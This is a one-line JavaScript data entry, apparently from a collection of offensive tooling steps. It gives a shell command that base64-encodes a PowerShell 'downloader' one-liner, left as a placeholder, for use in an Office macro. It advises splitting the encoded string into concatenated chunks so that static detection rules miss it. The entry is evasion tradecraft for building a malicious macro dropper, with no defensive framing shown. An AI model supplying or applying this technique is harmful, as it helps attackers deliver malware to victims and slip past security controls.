Object.assign(n[8445],{"tool":"sh","run":"echo -n 'powershell one-liner here' | iconv -t UTF-16LE | base64 -w 0","note":"Encode the downloader. In the macro, split the b64 into concatenated chunks (Str = Str & \"...\") — long single strings trip static rules."});
